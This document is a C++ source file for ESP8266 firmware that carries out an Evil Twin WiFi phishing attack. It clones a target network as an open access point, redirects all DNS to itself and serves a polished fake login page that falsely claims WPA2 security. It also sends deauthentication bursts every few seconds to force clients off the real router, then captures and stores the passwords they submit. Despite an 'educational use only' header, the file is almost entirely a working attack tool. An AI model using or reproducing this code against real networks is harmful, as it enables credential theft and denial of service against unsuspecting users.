/*
 * evil_twin.cpp — Evil Twin WiFi phishing with captive portal
 *
 * ================================================================
 *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
 *  Created by: Shawal Ahmad Mohmand
 * ================================================================
 *
 * Flow:
 *  1. Clone target SSID as open AP
 *  2. Run DNS server that redirects ALL domains to our IP
 *  3. Serve a professional-looking WiFi login page
 *  4. Continuously deauth the original AP to force clients to us
 *  5. Capture submitted passwords, show on OLED + web
 */

#include "evil_twin.h"
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
extern "C" {
  #include "user_interface.h"
}

// ── State ───────────────────────────────────────────────────────
static bool _running = false;
static char _cloneSSID[33];
static uint8_t _cloneChannel = 1;
static uint8_t _cloneBSSID[6];
static uint32_t _deauthCount = 0;
static unsigned long _lastDeauth = 0;

static CapturedCred _creds[MAX_CAPTURED_CREDS];
static uint8_t _credCount = 0;

static ESP8266WebServer* _portal = nullptr;
static DNSServer* _dns = nullptr;

// Deauth frame for background deauthing original AP
static uint8_t _etDeauth[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x01, 0x00
};

// ── Captive Portal HTML ─────────────────────────────────────────
static const char _portalPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;
display:flex;align-items:center;justify-content:center;color:#fff}
.card{background:rgba(255,255,255,0.08);backdrop-filter:blur(20px);
border:1px solid rgba(255,255,255,0.15);border-radius:20px;padding:40px;
width:90%;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
.logo{text-align:center;margin-bottom:25px}
.logo svg{width:50px;height:50px;fill:#6C63FF}
h2{text-align:center;font-size:20px;margin-bottom:5px;color:#fff}
.sub{text-align:center;font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:25px}
.ssid{color:#6C63FF;font-weight:700}
input{width:100%;padding:14px 16px;border:1px solid rgba(255,255,255,0.2);
border-radius:12px;background:rgba(255,255,255,0.05);color:#fff;
font-size:15px;margin-bottom:15px;outline:none;transition:.3s}
input:focus{border-color:#6C63FF;box-shadow:0 0 15px rgba(108,99,255,0.3)}
input::placeholder{color:rgba(255,255,255,0.4)}
button{width:100%;padding:14px;border:none;border-radius:12px;
background:linear-gradient(135deg,#6C63FF,#5A52D5);color:#fff;
font-size:16px;font-weight:600;cursor:pointer;transition:.3s;
box-shadow:0 4px 15px rgba(108,99,255,0.4)}
button:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(108,99,255,0.6)}
.msg{text-align:center;font-size:12px;color:rgba(255,255,255,0.5);margin-top:15px}
.err{color:#FF6B6B;text-align:center;font-size:13px;margin-bottom:10px;display:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
</div>
<h2>WiFi Authentication</h2>
<p class="sub">Enter password to connect to <span class="ssid">%SSID%</span></p>
<div class="err" id="err">Incorrect password. Please try again.</div>
<form action="/login" method="POST">
<input type="password" name="password" placeholder="Enter WiFi Password" required autofocus>
<button type="submit">Connect</button>
</form>
<p class="msg">Your connection is secured with WPA2 encryption</p>
</div>
</body>
</html>
)rawliteral";

static const char _successPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
.card{background:rgba(255,255,255,0.08);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.15);
border-radius:20px;padding:40px;width:90%;max-width:380px;text-align:center}
.check{font-size:60px;margin-bottom:15px}
h2{margin-bottom:10px}
p{color:rgba(255,255,255,0.6);font-size:14px}
</style>
</head>
<body>
<div class="card">
<div class="check">✓</div>
<h2>Authenticating...</h2>
<p>Please wait while we verify your credentials. You will be connected shortly.</p>
</div>
</body>
</html>
)rawliteral";

// ── Portal Handlers ─────────────────────────────────────────────

static void _handlePortalRoot() {
  String page = FPSTR(_portalPage);
  page.replace("%SSID%", _cloneSSID);
  _portal->send(200, "text/html", page);
}

static void _handleLogin() {
  if (_portal->hasArg("password")) {
    String pw = _portal->arg("password");
    if (pw.length() > 0 && _credCount < MAX_CAPTURED_CREDS) {
      strncpy(_creds[_credCount].ssid, _cloneSSID, 32);
      _creds[_credCount].ssid[32] = '\0';
      strncpy(_creds[_credCount].password, pw.c_str(), 64);
      _creds[_credCount].password[64] = '\0';
      _creds[_credCount].timestamp = millis() / 1000;
      _credCount++;
      DBGF("[ET] Password captured: %s\n", pw.c_str());
    }
  }
  _portal->send(200, "text/html", FPSTR(_successPage));
}

// Catch-all for captive portal redirect
static void _handleNotFound() {
  _portal->sendHeader("Location", "http://192.168.4.1", true);
  _portal->send(302, "text/plain", "");
}

// ── Background deauth sender ────────────────────────────────────
static void _sendDeauthBurst() {
  // Switch to STA mode momentarily to send deauth
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_channel(_cloneChannel);

  for (int i = 0; i < 20; i++) {
    _etDeauth[22] = (_deauthCount & 0xFF);
    _etDeauth[23] = ((_deauthCount >> 8) & 0x0F);
    wifi_send_pkt_freedom(_etDeauth, sizeof(_etDeauth), 0);
    _deauthCount++;
    delayMicroseconds(200);
  }

  wifi_promiscuous_enable(0);
  // Switch back to AP mode
  wifi_set_opmode(SOFTAP_MODE);
}

// ── Public API ──────────────────────────────────────────────────

void evil_twin_start(const char* targetSSID, uint8_t targetChannel, const uint8_t targetBSSID[6]) {
  strncpy(_cloneSSID, targetSSID, 32);
  _cloneSSID[32] = '\0';
  _cloneChannel = targetChannel;
  memcpy(_cloneBSSID, targetBSSID, 6);
  _credCount = 0;
  _deauthCount = 0;
  _lastDeauth = 0;

  // Setup deauth frame for target
  memcpy(&_etDeauth[10], _cloneBSSID, 6);
  memcpy(&_etDeauth[16], _cloneBSSID, 6);
  memset(&_etDeauth[4], 0xFF, 6);

  // Create fake AP with same SSID (open, no password)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(_cloneSSID, "", _cloneChannel);

  // Start DNS — redirect everything to us
  if (_dns) delete _dns;
  _dns = new DNSServer();
  _dns->setErrorReplyCode(DNSReplyCode::NoError);
  _dns->start(DNS_PORT, "*", IPAddress(192,168,4,1));

  // Start captive portal web server
  if (_portal) delete _portal;
  _portal = new ESP8266WebServer(CAPTIVE_PORTAL_PORT);
  _portal->on("/", _handlePortalRoot);
  _portal->on("/login", HTTP_POST, _handleLogin);
  _portal->on("/generate_204", _handlePortalRoot);     // Android
  _portal->on("/fwlink", _handlePortalRoot);           // Windows
  _portal->on("/hotspot-detect.html", _handlePortalRoot); // Apple
  _portal->on("/connecttest.txt", _handlePortalRoot);  // Windows 11
  _portal->on("/redirect", _handlePortalRoot);
  _portal->on("/success.txt", _handlePortalRoot);
  _portal->onNotFound(_handleNotFound);
  _portal->begin();

  _running = true;
  DBGF("[ET] Evil twin started: SSID=%s ch=%d\n", _cloneSSID, _cloneChannel);
}

void evil_twin_stop() {
  _running = false;
  if (_portal) { _portal->stop(); delete _portal; _portal = nullptr; }
  if (_dns) { _dns->stop(); delete _dns; _dns = nullptr; }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  wifi_promiscuous_enable(0);
  DBGLN(F("[ET] Evil twin stopped"));
}

void evil_twin_update() {
  if (!_running) return;

  // Handle DNS + web
  if (_dns) _dns->processNextRequest();
  if (_portal) _portal->handleClient();

  // Send deauth bursts periodically to kick clients off real AP
  unsigned long now = millis();
  if (now - _lastDeauth > 3000) {  // Every 3 seconds
    _lastDeauth = now;
    _sendDeauthBurst();
  }
}

bool evil_twin_isRunning() {
  return _running;
}

uint8_t evil_twin_getCredCount() {
  return _credCount;
}

CapturedCred* evil_twin_getCreds() {
  return _creds;
}

uint32_t evil_twin_getDeauthCount() {
  return _deauthCount;
}

String evil_twin_getIP() {
  return WiFi.softAPIP().toString();
}
